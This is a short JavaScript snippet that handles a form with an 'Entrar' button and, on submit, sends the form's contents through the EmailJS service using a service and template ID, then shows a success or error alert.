const btn = document.getElementById('button');

document.getElementById('forme')
 .addEventListener('submit', function(event) {
   event.preventDefault();

   btn.value = 'Entrando...';

   const serviceID = 'default_service';
   const templateID = 'template_8nju2sn';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'Entrar';
      alert('Sent!');
    }, (err) => {
      btn.value = 'Entrar';
      alert(JSON.stringify(err));
    });
});